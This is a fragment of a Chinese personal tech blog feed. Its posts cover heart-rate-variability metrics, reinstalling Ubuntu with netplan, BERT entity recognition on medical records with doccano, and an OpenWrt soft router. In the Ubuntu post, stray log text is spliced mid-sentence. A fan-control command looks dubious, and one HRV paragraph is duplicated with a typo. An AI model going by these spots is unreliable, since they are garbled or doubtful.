<li><p>pNN50：相邻NN间期相差&gt;50ms的数量占总心搏数的百 分比</p></li>
<li><p>rMSSD(ms)：相邻NN间期差值的均方根</p></li>
</ul>
<p>rMSSD反映每搏NN间期变化的平均绝对值，对不规律心搏和/或心搏波形标记错误的敏感性也很高。</p>
<p>24小时记录得到的SDANN值低下表明缺乏昼夜节律。</p>
<h3 id="频域特征">频域特征</h3>
<ul>
<li><p>总功率（TP）：频段≤0. 4Hz。</p></li>
<li><p>超低频功率（ULF）：频段≤ 0. 003Hz。</p></li>
<li><p>极低频功率（VLF）：频段 0. 003~0. 04Hz。</p></li>
<li><p>低频功率（LF）：频段 0. 04~0. 15Hz。</p></li>
<li><p>高频功率（HF）：频段 0. 15~0. 4Hz。</p></li>
<li><p>LF/HF: 低频功率和高频功率的比值</p></li>
</ul>
<p>LF反映副交感传出神经(迷走神经)和交感传出神经系统活性的综合调节</p>
<p>HF反映副交感传出神经(迷走神经)活动的调节</p>
<h3 id="非线性分析">非线性分析</h3>
<h4 id="动态心电图holter-monitor">动态心电图（Holter monitor）</h4>
<p>持续记录24小时或更久（几个月或一年以上）的长时间心电图数据，主要用来检测心律失常或传导异常和晕厥或晕厥前兆。</p>
<p><span class="math inline">\(a\dot{b}c\)</span></p>
<h5 id="洛伦兹散点图">洛伦兹散点图</h5>
<p><img src="heart-rate-varibility/201804091524569747.png" alt="img" style="zoom:80%;" /></p>
<p>把前1个心动周期长度（ms）定为横坐标、后1个心动周期长度（ms）定为纵坐标，即可在直角坐标系中确定一点。这样一个点就由3个QRS波（R波）、2个RR间期决定。第1个RR间期R1R2和第2个RR间期R2R3为第1个点，第2个RR间期R2R3和第3个RR间期R3R4为第2个点，依次类推，从R1 -&gt; Rn作图就可得到 n-2 个点，绘制心率散点图（洛伦兹散点图，Lorenz Plot），判断窦性心率、室上性和室性心率失常。正常窦性心律呈彗星状，心衰、房颤等症状会出现不同的散点图。窦性心律沿45°线分布，呈彗星状</p>
<p><img src="heart-rate-varibility/image-20191224202624859.png" alt="室性早搏" style="zoom: 67%;" /></p>
<p><img src="heart-rate-varibility/image-20191224202756257.png" alt="房性早搏" style="zoom: 67%;" /></p>
<p>散点图可用于：</p>
<p>评价心率波动范围（散点图的位置分布）</p>
<p>评价自主神经调节（长轴）</p>
<p>评价心率变异（短轴）</p>
<p>诊断心律失常（散点图的形态）</p>
<h5 id="差值散点图">差值散点图</h5>
<p>首先对序列 <span class="math inline">\(RiR_{i+1}\)</span> 做一阶差分, 得到序列 <span class="math inline">\(d_j ,j=1,2,\dots N-1\)</span> 然后以 <span class="math inline">\((d_j, d_{j+1})\)</span> 为坐标绘制散点图（Poincaré散点图）。差值散点图反映了RR间期差值的离散度 ,对连续RR间期的变化十分敏感。</p>
<p>首先对序列<span class="math inline">\(R_iR_{i\times1}\)</span>做一阶差分, 得到序列 <span class="math inline">\(d_j,j=1,2,\dots N-1\)</span> 然后以 <span class="math inline">\((d_j, d_{j+1})\)</span> 为坐标绘制散点图（Poincaré散点图）。差值散点图反映了RR间期差值的离散度 ,对连续RR间期的变化十分敏感。</p>
<figure>
<img src="/2873/image-20191225111057030.png" alt="健康人和CHF患者的散点图" /><figcaption aria-hidden="true">健康人和CHF患者的散点图</figcaption>
</figure>
<h5 id="三维散点图">三维散点图</h5>
<p>三维散点图的一些意义还不明确，医院里实际用的也很少 <img src="/2873/3D-scatter-plot.png" alt="心率变异性三维散点图" /></p>
<h5 id="心率震荡hrt">心率震荡（HRT）</h5>
<p>心率震荡（heart rate turbulence）是指发生室性早搏后，窦性心律出现短暂的加速和减速的过程。检测HRT异常有助于预测自主神经功能障碍以及心血管事件的风险增加。</p>
<p>分析HRT通常需要24小时HRV动态心电图，主要有震荡初始(turbulence onset, TO)和震荡斜率(turbulence slope, TS)两个指标。</p>
<h2 id="临床价值和应用">临床价值和应用</h2>
<h3 id="心肌梗死死亡率预测">心肌梗死死亡率预测</h3>
<p>心梗后早期(14日内)，若检测到患者的HRV指标降低，则心梗后3年内的死亡风险增至3-4倍。</p>
<h3 id="心力衰竭">心力衰竭</h3>
<p>已知就预后而言，HRV降低是总体死亡、心力衰竭死亡、心脏性猝死、室性心律失常和心脏移植的 独立预测指标</p>
<h3 id="评估自主神经病变">评估自主神经病变</h3>
<p>HRV明显降低或缺失可以作为辅助指标。</p>
<h3 id="冠心病">冠心病</h3>
<p>冠心病患者的HRV显著降低,且与冠状动脉病变支数及狭窄程度呈负相关,但与冠状动脉病变部位无关。</p>
<h3 id="检测精神压力">检测精神压力</h3>
<p>短时HRV变化可用于辅助检测精神压力</p>
<p>迷走神经的冲动传导频率受呼吸频率和深度的调节而呈现节律性波动，呼吸性窦性心律不齐(respiratory sinus arrhythmia, RSA)。在有节奏的呼吸或冥想时，RSA可被放大。</p>
<h3 id="评估体育表现">评估体育表现</h3>
<p>可以作为推测无氧阈的较为精确的指标之一</p>
<blockquote>
<p>注意 在运动评估中一般只有要求无伤等才会首先考虑HRV，一般是用血清肌酸激酶(CK)、血清睾酮(T)、血红蛋白、乳酸等</p>
</blockquote>
<h3 id="监测训练负荷及诊断运动性疲劳">监测训练负荷及诊断运动性疲劳</h3>
<p>交感一副交感神经张力的平衡会随着运动强度的改变而波</p>
<h3 id="运动康复医学领域">运动康复医学领域</h3>
<p>用于自主神经功能改善的评估</p>
<h3 id="睡眠分期">睡眠分期</h3>
<p>略</p>
<h2 id="其他">其他</h2>
<h3 id="呼吸和心率变异性">呼吸和心率变异性</h3>
<h4 id="bcg信号中的呼吸信息">BCG信号中的呼吸信息</h4>
<p>在采集到的BCG信号中，会包含呼吸信息，提取心率变异性通常要去除呼吸的干扰。</p>
<p>但是在一些利用HRV进一步分析情绪、压力、睡眠分期的时候，可以考虑保留部分呼吸特征并将呼吸特征纳入到检测和分类中，有时可以提高检测的准确率。</p>
<p>在心率变异性分析中纳入呼吸频率信息以进行压力评估</p>
<h4 id="呼吸变异性">呼吸变异性</h4>
<p>呼吸频率变异性(Respiratory Rate Variability，RRV, 有的地方也叫Breath Rate Variability），和心率变异性一样反映了一些生理特征，但是这种非电信号采集难，噪声大，不规律，包含的信息也比心电和脉搏波等信号少。除了</p>
<p>目前对于RRV的研究比较少，也很少有人用这个特征做睡眠分期检测、疲劳压力检测或睡眠呼吸暂停的检测。一些使用雷达等手段检测疲劳或者睡眠的研究将这项指标作为判断依据。雷达和监控视频等可以在较近的距离探测人体呼吸活动和心率，但是这样采集分离出的心动信息用作睡眠和疲劳监测不如直接采集呼吸和运动的信息进行分析。对于体重指数（body mass index ）过高的的超重人群、较复杂的干扰和活动等情景，使用雷达等方式检测压力或疲劳时HRV准确率大幅降低，从心动信息检测不如直接从呼吸信息检测。在这些场景下会使用呼吸和体动信息来作为指标。</p>
<h2 id="数据和软件">数据和软件</h2>
<ol type="1">
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cua3ViaW9zLmNvbS9ocnYtc3RhbmRhcmQv">https://www.kubios.com/hrv-standard/<i class="fa fa-external-link-alt"></i></span> 免费的HRV分析软件</li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cucGh5c2lvbmV0Lm9yZy8jbGF0ZXN0">https://www.physionet.org/#latest<i class="fa fa-external-link-alt"></i></span> 心电图数据</li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1EX0tZdjdwWEF2UQ==">https://www.youtube.com/watch?v=D_KYv7pXAvQ<i class="fa fa-external-link-alt"></i></span> rPPG检测心率</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9weXBpLm9yZy9wcm9qZWN0L2JvYi5ycHBnLmJhc2Uv">https://pypi.org/project/bob.rppg.base/<i class="fa fa-external-link-alt"></i></span> rPPG的开源库，数据集MAHNOB-HCI和DEAP</li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuaHJ2NHRyYWluaW5nLmNvbS8=">https://www.hrv4training.com/<i class="fa fa-external-link-alt"></i></span> 一个用蓝牙测HRV的APP，准确率貌似还可以</li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZmlyc3RiZWF0LmNvbS9lbi9maXJzdGJlYXQtaHJ2LXN1bW1pdC0yMDE5Lw==">Firstbeat HRV Summit<i class="fa fa-external-link-alt"></i></span> Firstbeat公司的HRV峰会，一些商用搞的比较好的东西</li>
</ol>
]]></content>
      <categories>
        <category>102网吧日常</category>
      </categories>
      <tags>
        <tag>HRV</tag>
        <tag>BCG</tag>
      </tags>
  </entry>
  <entry>
    <title>重装Ubuntu</title>
    <url>/2d5/</url>
    <content><![CDATA[<p>祖传服务器传到了我的手里, 行吧。其实我想把标题改成Ubuntu内部错误的解决办法（不是 <a id="more"></a></p>
<h2 id="更新和洗手">更新（和洗手）</h2>
<p>19年写的这个20年不知道怎么在2020年有一段时间被扔到了<code>重装Ubuntu</code>搜索结果的最前面，我这个小破站访问量暴增。然而那个时候20.04LTS都出了，已经有点过时了，而我19年那会写的那个几乎属于个人吐槽，差不多是我博客迁到，完全不适合作为一个教程。可能骗了很多人进来，</p>
<p>装什么Ubuntu啊，还是Arch香，群里个个都是人才，说话又好听</p>
<p><img src="/2d5/1611832700.webp" /></p>
<p>但是祖传的是Ubuntu，但是假期我要回家滚又不敢远程滚, 但是我不想折腾显卡驱动了（Nvidia,fuck you!），但是这是工作站和服务器，上Arch天天滚可不太好。</p>
<p><del>但是随便装个Ubuntu不仅快，他们跑深度学习的时候抄CSDN配置环境也方便</del></p>
<p><del>最重要的，又不是我用。</del></p>
<p><del>GNOME内存泄漏关我什么事</del></p>
<p><del>Ubuntu内部错误关我什么事</del></p>
<p>还是去用Ubuntu吧.jpg</p>
<p><img src="/2d5/1611834396.webp" /></p>
<p><img src="/2d5/1611834449.webp" /></p>
<h2 id="认真发言">认真发言</h2>
<p>其实你可以试试Debian（Canonical强推snap太烦人了）</p>
<h3 id="关于桌面de">关于桌面（DE）</h3>
<p>带桌面的版本建议避开Ubuntu的GNOME，那个东西。。。</p>
<p>可以试试Linux Mint，或者Fedora（这个的GNOME应该比 Ubuntu 16、18 那几个整天内存泄露的GNOME版本稳多了）</p>
<p>其实我推荐KDE，可以试试Kubuntu（或者KDE Neon？）</p>
<p>机器配置较差请直接Lubuntu，稳如老狗，除了略简陋没有别的缺点。</p>
<p>一众WM用户应该不会搜索这么蠢的关键词搜到我这里来，这里不谈WM了。</p>
<h3 id="关于服务器">关于服务器</h3>
<p>小作坊没有专职运维和技术支持，其实服务器建议试试Debian或者Ubuntu LTS，Debian stable稳如老狗</p>
<p><del>众所周知，Debian testing 都比 Ubuntu LTS 稳（注意这个安全更新比较慢，个人用户可以testing，开了公网端口的工作站不要用这个）</del></p>
<p>不过Ubuntu和CentOS6、7比起来，还是瞬间和蔼可亲了不少</p>
<p>求求新入坑的别再跟着什么鸟哥私房菜之类的老教程用CentOS了，2020年CentOS8都被扬了，REHL马上就要给小作坊免费了，小作坊真迷信稳定上REHL吧</p>
<p>没事不要用所谓稳定的老版本然后找不到包只能自己手动编译，就不说c/c++那一堆lib了，我已经见过不少人在编译python的时候没开ssl当场翻车。</p>
<p>什么你说容器？你试过在CentOS6上面弄Docker和k8s吗，我在教研室的祖传阿里云上试过一次，从此再也不想看到CentOS了</p>
<p>（整天在CentOS上手动编译凸显运维重要性和工作量的除外）</p>
<h3 id="太长不看">太长不看</h3>
<p>我是说，除了Ubuntu（以及其默认捆绑的GNOME、gtk、rime输入法,强推的snap，祖传的内部错误）,还有很多选择</p>
<p>或者你用WSL之类的东西也行呢（WSL2显卡驱动也差不多能用了，虽然io效率还有些问题）。</p>
<!-- 上回书说到，服务器一不小心卸载了iptables
现在准备重装。还是打算装Ubuntu Server（并不打算装Manjaro，也不适合搞桌面版，今天试过一下Ubuntu Desktop，图形化界面由于服务器没有独显直接卡到爆炸）
~~初步打算安装Ubuntu server 16.04.6LTS, 使用LVM分区~~
安装Ubuntu18.04LTS，之前VPS用过一阵18，也没注意有什么新特性，据说还是改了一些东西⬇

>据说
内核更新到了 Linux kernel 4.15，这就意味着新增了不少特性 bbr什么的
网络管理工具 ifupdown 已经彻底废弃，建议全面拥抱 ip 命令
DNS 由 systemd 全面接管，接口监听在 127.0.0.53:53，配置文件在 /etc/systemd/resolved.conf，修改后重启服务即可 systemctl restart systemd-resolved。不要听网上那些奇怪的教程教你如何修改 /etc/resolv.conf
swap 文件来替代 swap 分区

## 装Ubuntu16.04LTS

### 安装

下载iso，制作启动盘，这里用的Rufus
<img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/rufus.png" alt="Picture" style="zoom:80%;" />

然后直接装，网卡直接自动识别了，配置也没什么好说的，可以参考这里[^1]或这里[^2],

### 后续配置

进去之后换你电镜像源（终端里vim改/etc/apt/sources.list）
apt包update&&upgrade
修改时区和系统时间
安装Docker，照着官方教程装Docker的时候根本下载不动,换了个国内的源
桌面不打算装gnome或者kde了，Mobaxterm用X11一般就够了

## 重新安装Ubuntu18.04 LTS

由于某些原因，决定还是换18

## 再次安装

UEFI启动
create bond这里先不配置了（只有一张网卡eno1），bound mode选默认的balance-rr
eno1网卡选择automatic自动获取ipv4和ipv6
镜像源这里输入你电的
选use the entire disk and set up LVM
~~是否安装openssh，空格选安装，选择从GitHub获取~~
然后输入你的用户名(先准备好key，当然这个时候要保证网也是通的)
这里勾选openssh之后一直报错，可能是网的问题，不勾选，等后面再装
分区就分一个/boot，一个/swap，一个/home
<!-- 
（当然你要先准备好key，先用git bash生成key
`ssh-keygen -t rsa -C 'your_email@example.com'`
再到Github的SSH设置里面把公钥填进去（id_rsa.pub里面的内容）
然后测试一下是否成功
<img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/ssh-github.png" alt="Picture" style="zoom:80%;" />
） -->
<!-- 然后是漫长的installing kernal
（不知道为什么装server比desktop版慢那么多）

bbr已经自带了，不用装了
设置root用户和用户组权限
装Docker参考这里[^3]
和英文官方教程那个差不多，主要是获取GPG的地址和Docker源换成国内的
换成国内中科大的镜像源（这个换了也时断时续可能连不上）
出现permission denied：

<pre class="line-numbers language-log" data-language="log"><code class="language-log">Got permission denied while trying to connect to the Docker daemon socket at unix:&#x2F;&#x2F;&#x2F;var&#x2F;run&#x2F;docker.sock: Get http:&#x2F;&#x2F;%2Fvar%2Frun%2Fdocker.sock&#x2F;v1.40&#x2F;containers&#x2F;json: dial unix &#x2F;var&#x2F;run&#x2F;docker.sock: connect: permission denied<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>是权限的问题，要加当前用户到用户组里面</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> gpasswd -a <span class="token variable">$&#123;<span class="token environment constant">USER</span>&#125;</span> docker<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="更改静态为ip">更改静态为ip</h3>
<p>网卡是eno1（服务器就一个网卡） Ubuntu18的配置改了，在<code>/etc/netplan/50-cloud-init.yaml</code>, 现在18使用netplan管理网络 配置文件是yaml格式，跟hexo和next主题的配置文件格式一样</p>
<pre class="line-numbers language-yml" data-language="yml"><code class="language-yml"># network: &#123;config: disabled&#125;
network:
    ethernets:
        eno1:
            dhcp4: true
    version: 2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>改成</p>
<pre class="line-numbers language-yml" data-language="yml"><code class="language-yml">network:
  version: 2
  renderer: networkd
  ethernets:
    eno1:   #配置的网卡名称
#      dhcp4: true    #dhcp4关闭
#      dhcp6: true    #dhcp6关闭
      addresses: [211.83.111.224&#x2F;23]   #设置本机IP及掩码
      gateway4: 211.83.110.1   #设置网关
      nameservers:
          addresses: [114.114.114.114, 8.8.8.8]   #设置DNS<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>(网关地址用<code>route -n</code>查看，配置参考<span class="exturl" data-url="aHR0cDovL2Jsb2cuc2luYS5jb20uY24vcy9ibG9nXzUzNzNiY2Y0MDEwMnhrNWcuaHRtbA==">ubuntu 18.04 netplan yaml配置固定IP地址<i class="fa fa-external-link-alt"></i></span>) d-homed//g → /systemd-homed/ INFO Path converted: /(?&lt;=[(&lt;s])(./)?systemd-homed//g → /systemd-homed/ INFO Path converted: /(?&lt;=[(&lt;s])(./)?systemd-home着默认 直接改成这样试试</p>
<pre class="line-numbers language-yml" data-language="yml"><code class="language-yml">network:
  version: 2
#  renderer: networkd
  ethernets:
    eno1:
      addresses: [211.83.111.224&#x2F;23]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>然后进/run/systemd/network看一下系统的网络配置文件</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /run/systemd/network`
<span class="token function">ls</span>
<span class="token function">cat</span> *<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>下面这样应该就可以了，吧.....？</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">root@xi102server:&#x2F;run&#x2F;systemd&#x2F;network# cat 10-netplan-eno1.network
[Match]
Name&#x3D;eno1

[Network]
LinkLocalAddressing&#x3D;ipv6
Address&#x3D;211.83.111.224&#x2F;23<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>行吧，搜出一堆东西都不靠谱，还是得看官网</p>
<h3 id="感想">感想</h3>
<p>服务器启动的声音真的大啊 一半以上的问题都是网络问题，校内这个网真的.... 靠镜像源救回半条狗命</p>
<p>Ubuntu18安装时配置网卡时想选静态ip选择Manual进去填写subnet, 结果那个subnet选项是<code>XXX.XXX.XXX.XXX/XX</code> 看了教研室其他设备相同频段的子网掩码是<code>255.255.254.0</code>，但是填了不行，用网上计算子网掩码的工具算了一下，就是<code>255.255.254.0</code></p>
<p><img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/netmmask.png" alt="Picture" style="zoom:80%;" /></p>
<p>暂时选了DHCP直接配置网卡，等进去再指定静态ip[^4]</p>
<p>哦，netplan好像把子网掩码的格式改了 原来是这样 &gt;address = 192.168.225.50 netmask = 255.255.255.0</p>
<p>改成了这种格式 &gt;addresses : [192.168.225.50/24]</p>
<p>滚去补习计网知识了 --&gt; --&gt;</p>
<h2 id="安装参考">安装参考</h2>
<p><span class="exturl" data-url="dHRwczovL3R1dG9yaWFscy51YnVudHUuY29tL3R1dG9yaWFsL3R1dG9yaWFsLWluc3RhbGwtdWJ1bnR1LXNlcnZlcg==">tutorial-install-ubuntu-server<i class="fa fa-external-link-alt"></i></span><br />
<span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL0xWTV8o566A5L2T5Lit5paHKQ==">LVM arch-wiki<i class="fa fa-external-link-alt"></i></span><br />
<span class="exturl" data-url="aHR0cHM6Ly95ZWFzeS5naXRib29rcy5pby9kb2NrZXJfcHJhY3RpY2UvaW5zdGFsbC91YnVudHUuaHRtbA==">Ubuntu 安装 Docker CE<i class="fa fa-external-link-alt"></i></span>、<span class="exturl" data-url="aHR0cHM6Ly95ZWFzeS5naXRib29rcy5pby9kb2NrZXJfcHJhY3RpY2UvaW5zdGFsbC9taXJyb3IuaHRtbA==">镜像加速器<i class="fa fa-external-link-alt"></i></span><br />
<span class="exturl" data-url="aHR0cHM6Ly93d3cudGVjbWludC5jb20vY29uZmlndXJlLW5ldHdvcmstc3RhdGljLWlwLWFkZHJlc3MtaW4tdWJ1bnR1Lw==">How to Configure Network Static IP Address in Ubuntu 18.04<i class="fa fa-external-link-alt"></i></span><br />
<span class="exturl" data-url="aHR0cHM6Ly9uZXRwbGFuLmlvL2V4YW1wbGVz">netplan官网的配置示例<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>102网吧日常</category>
      </categories>
      <tags>
        <tag>ubuntu</tag>
        <tag>重装</tag>
      </tags>
  </entry>
  <entry>
    <title>基于BERT的电子病历的命名实体识别</title>
    <url>/9112/</url>
    <content><![CDATA[<p>BERT效果确实好，就是有点吃内存</p>
<a id="more"></a>
<h2 id="序列标注">序列标注</h2>
<p>一些医院的电子病历拆分的很细，比如主诉这一个大项里面部位、症状、时间、状态都是分开的；另一些医院的电子病历就跟纯文本差不多，要把大段文字中的主要结构提出来需要自然语言处理或者人工录入。一般做自然语言处理的时候都是几个部分分开做的，因为不同部分差异比较大，分开训练识别效果好。大部分电子病历包括入院记录、首次病程记录、病程记录、出院记录、手术记录、护理记录、病案首页，这里面又分为一些检查项、时间、主诉、既往史之类的小项。不少电子病历系统导出都是XML的，一般都是把电子病历拆成主诉那种一个个不能再拆的纯文本部分，比如主诉，见<a href="https://zhangjk98.xyz/81d4/">上一篇</a>，然后再对不能拆分的纯文本用人工或自然语言处理进一步拆分。这就是所谓的电子病历结构化。</p>
<p>比如一段主诉：</p>
<blockquote>
<p>反复胸痛伴胸闷1+年，加重20+天。</p>
</blockquote>
<p>按照规范一定的规范可分为几个不同的小块，比如下面这十一种：</p>
<blockquote>
<p>部位、症状、持续时间、伴随部位、伴随症状、伴随时间、状 态、病因/其他、观察项目、观察结果、既往史</p>
</blockquote>
<p>胸是部位、痛是症状、1+年是持续时间、反复是状态......</p>
<p>标注出来的结果可以保存为json格式，labels里面的list分别为起始位置、结束位置、标签</p>
<pre class="line-numbers language-none"><code class="language-none">
&#123;&quot;text&quot;: &quot;反复胸痛伴胸闷1+年，加重20+天。&quot;, &quot;labels&quot;: [[0, 2, &quot;状态&quot;], [2, 3, &quot;部位&quot;], [3, 4, &quot;症状&quot;], [5, 7, &quot;伴随症状&quot;], [7, 10, &quot;伴随时间&quot;], [11, 17, &quot;持续时间&quot;]]&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>BIO格式，大概是这个样子：B，begin标签开始；I，inside包含在标签内，O，outside在标签外</p>
<pre class="line-numbers language-none"><code class="language-none">
反 B-状态
复 I-状态
胸 B-部位
痛 B-症状
伴 O
胸 B-伴随症状
闷 I-伴随症状
1 B-伴随时间
+ I-伴随时间
年 I-伴随时间
， O
加 B-持续时间
重 I-持续时间
2 I-持续时间
0 I-持续时间
+ I-持续时间
天 I-持续时间
。 O<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>BERT的接口是BIO格式，标注工具doccano，这里写两个互相转换的脚本就行了，标注完成后将json转为BIO，训练和预测完成后将BIO预测结果转为JSON</p>
<h2 id="训练模型">训练模型</h2>
<p>NLP里面的命名实体识别很早就用在电子病历上，早期的机器学习方法效果一般，后来开始用RNN和CNN，后来用LSTM，再后来用BERT，效果一直在提升，BERT基本上到顶了（好一点的训练数据BERT基本能达到90%以上，对于主诉这样的较短的简单条目甚至能达到98%以上）</p>
<h2 id="其他杂项">其他杂项</h2>
<h3 id="doccano的部署和使用">doccano的部署和使用</h3>
<h4 id="部署">部署</h4>
<h5 id="docker方式">Docker方式</h5>
<h6 id="构建和部署">构建和部署</h6>
<p>运行以下命令</p>
<pre class="line-numbers language-none"><code class="language-none">
$ docker pull chakkiworks&#x2F;doccano # 拉取官方镜像
$ docker run -d --name doccano -p 80:8000 chakkiworks&#x2F;doccano # 运行镜像，请按需修改端口
$ docker exec doccano tools&#x2F;create-admin.sh &quot;admin&quot; &quot;[email protected]&quot; &quot;password&quot; # 创建用户并指定密码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>注意 Docker镜像run之后会产生三个容器，doccona_nginx、doccona_backend、docker_frontend,其中docker_frontend在构建完成后会直接exit，这是一个feature，不是bug，它的主要作用是webpack打包</p>
<figure>
<img src="/9112/image-20200109220759931.png" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
</blockquote>
<h4 id="访问docker中的postgresql数据库中的数据">访问Docker中的PostgreSQL数据库中的数据</h4>
<p>由于数据库安全问题，数据库分离再一个单独的容器中并且 首先执行<code>Docker exec</code>命令进入相应的PostgreSQL数据库容器</p>
<p>应该看到下图这样，终端从宿主机切换进容器</p>
<figure>
<img src="/9112/image-20200109220232851.png" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<p>在容器的shell中用命令进入数据库</p>
<pre class="line-numbers language-none"><code class="language-none">
$ psql -h 127.0.0.1 -d doccano -U doccano -p 5432 # 注意你的host，数据库名、用户名和端口<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>应该看到下图这样，终端从Docker容器切进数据库</p>
<figure>
<img src="/9112/image-20200109220100751.png" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<p>然后执行<code>\l</code>等命令进入和查看数据库（执行SQL）</p>
<h4 id="使用">使用</h4>
<p>后台管理入口是这个http://yoursite/admin/，就是一个Django自带的后台管理</p>
<figure>
<img src="/9112/image-20200411204841203-1586654887394.png" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<figure>
<img src="/9112/image-20200411205005107-1586654884937.png" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<figure>
<img src="/9112/image-20200411205102588-1586654882966.png" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<p>登录进去后可自行添加账号和项目并设置权限和标签，标注项目选择sequential labeing即可，导出时选择JSONL格式</p>
<p>这个数据比较多的时候没有自动跳转比较麻烦，请直接在浏览器地址栏使用url跳转</p>
<p>比如，修改浏览器后面的url，#后面的offset改为685，直接回车，就可以从当前的689跳转到第685个数据</p>
<p>http://yoursite/projects/6/#offset=685</p>
<figure>
<img src="/9112/image-20200307213544539.png" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<h2 id="注">注</h2>
<p>https://github.com/doccano/doccano 一个开源的标注工具</p>
<p>https://github.com/macanv/BERT-BiLSTM-CRF-NER 一个BERT的NER工具包</p>
]]></content>
      <categories>
        <category>102网吧日常</category>
      </categories>
      <tags>
        <tag>bert</tag>
        <tag>NER</tag>
      </tags>
  </entry>
  <entry>
    <title>垃圾佬的Openwrt软路由</title>
    <url>/openwrt/</url>
    <content><![CDATA[<p>又是捡垃圾的快乐一天 <a id="more"></a></p>
<h2 id="材料">材料</h2>
<h3 id="教研室捡来的垃圾">教研室捡来的垃圾</h3>
<blockquote>
<p>又不是不能用</p>
</blockquote>
<ul>
<li>2GB 内存条（看起来全新实际上至少八九年前的了，别问为什么只有2G，这是教研室能捡垃圾捡到的最后一块内存条了）</li>
<li>120G intel固态（包浆成色，上个月刚从一个旧电脑上拆下来的）</li>
<li>一块 i5 4570 的CPU（战斗成色，貌似也六年了）</li>
<li>一个风扇（战损成色，全是灰）</li>
<li>六七年前的华硕主板（伊拉克战损成色）</li>
<li>一个三星显示器（屏幕漏光，也有五六年了，装系统临时用一下）</li>
<li>一个2014年的老机箱（战斗成色，全是灰）</li>
<li>一个主机电源（不是很新，200W）</li>
<li>VGA线、电源线、排线（普通成色）</li>
<li>螺丝等（一大把旧主机上拆下来的）</li>
<li>键盘（N年前的薄膜，伊拉克战损成色，全是灰）</li>
</ul>
<p>对，102网吧的主板就是这样子的战损主板</p>
<figure>
<img src="/openwrt/image-20201030191635951.webp" alt="对，只有这种主板了" /><figcaption aria-hidden="true">对，只有这种主板了</figcaption>
</figure>
<h3 id="全新的和自掏腰包的">全新的和自掏腰包的</h3>
<p>基本都是室友出的钱</p>
<ul>
<li>螺丝刀等（全新，室友的）</li>
<li>一个插排（昨天室友买的）</li>
<li>硅脂（全新）</li>
<li>网卡（室友网购的，刚到）</li>
<li>网线（教研室网线太老了，就不捡垃圾了）</li>
<li>clash和v2ray订阅，机场买的</li>
</ul>
<h2 id="刷机">刷机</h2>
<p>自行编译时间太长就用人家编译好的了, 室友刷的。本来以为可能2G的老内存可能会卡，结果室友的win10 pe上去意外的流畅。</p>
<p>借用了这个<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0xvbW90SG8vVUVTVEMtTmV0d29ya0F1dG9Db25uZWN0">电子科技大学校园网自动登陆脚本<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="一点小插曲">一点小插曲</h2>
<p>晚上室友买完插排，第二天我发现教研室的一个旧箱子里满满一箱子插排，好家伙，亏了一个亿。</p>
<figure>
<img src="/openwrt/image-20201030191838215.webp" alt="这么多插排...." /><figcaption aria-hidden="true">这么多插排....</figcaption>
</figure>
<p>本来Openclash都整好了，结果发现室友的安卓电报没法自行分流。换成了 ssr plus</p>
<p>装好之后发现风扇声音有点大........直接把风扇线拔了，世界终于清净了。至于散热，问题不大（这么点负载总不可能把CPU给烧了）。</p>
<p>ps. 正确的做法是SSH上去</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">fanspeedctl stop --all --now<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>固态闲置了100多个G</p>
<h2 id="突然发现了clash的正确使用方式">突然发现了clash的正确使用方式</h2>
<p>之前一直很不喜欢clash，clash for win10的图形界面操作在我看起来特别反人类，安卓和平板上clash的app耗电惊人。自动切换线路和分流对我来说又没什么用，一直觉得clash鸡肋，不知道为什么这么多人都在说clash香。</p>
<p>直到今天室友带入坑上了软路由，好家伙，自动分流和切换真香</p>
<p>clash这种就适合软路由或者台式机什么的，手机和平板耗电根本顶不住，挂在后台掉电太快了</p>
]]></content>
      <categories>
        <category>102网吧日常</category>
      </categories>
      <tags>
        <tag>openwrt</tag>
        <tag>捡垃圾</tag>
      </tags>
